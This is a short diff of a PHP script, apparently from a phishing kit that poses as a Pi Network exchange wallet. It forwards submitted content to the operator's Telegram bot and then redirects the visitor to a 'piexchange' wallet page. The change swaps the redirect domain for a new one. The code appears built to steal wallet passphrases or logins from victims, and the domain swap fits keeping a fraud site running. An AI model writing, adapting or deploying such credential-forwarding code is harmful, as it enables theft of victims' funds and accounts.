@@ -28,5 +28,5 @@ if (!empty($content)) {  // Pengecekan apakah $content tidak kosong
     sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot);
 }
 
-header('Location: https://piexchange.biz.id/wallet');
+header('Location: https://piexchange.my.id/wallet');
 ?>
